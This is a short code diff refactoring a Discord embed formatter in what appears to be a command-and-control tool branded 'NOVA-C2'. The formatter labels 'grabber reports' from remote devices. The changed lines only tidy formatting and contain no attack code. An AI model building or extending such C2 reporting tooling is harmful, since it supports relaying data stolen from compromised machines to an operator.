@@ -115,8 +115,7 @@ export function formatDeviceResponse(content, deviceName = 'Device') {
 
   // For grabber reports, enhance title
   if (grabberReport) {
-    const reportLine = lines.find(l => l.includes('SMART GRAB REPORT'))
-    if (reportLine) title = `🔍 GRABBER REPORT`
+    if (lines.find(l => l.includes('SMART GRAB REPORT'))) title = `🔍 GRABBER REPORT`
     color = C.crimson
   }
 
@@ -126,13 +125,13 @@ export function formatDeviceResponse(content, deviceName = 'Device') {
     : `\`\`\`${content.replace(/`/g, '\u200B`').slice(0, 4000)}\`\`\``
   const embed = new EmbedBuilder()
     .setColor(color)
-    .setAuthor({ name: resolvedName, iconURL: ICONS?.footer || undefined })
+    .setAuthor({ name: resolvedName, iconURL: ICONS.footer || undefined })
     .setTitle(title)
     .setDescription(embedDesc)
     .setTimestamp()
 
   if (fields.length > 0) embed.addFields(fields.slice(0, 25))
-  embed.setFooter({ text: `NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS?.footer || undefined })
+  embed.setFooter({ text: `NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })
 
   return { embeds: [embed] }
 }
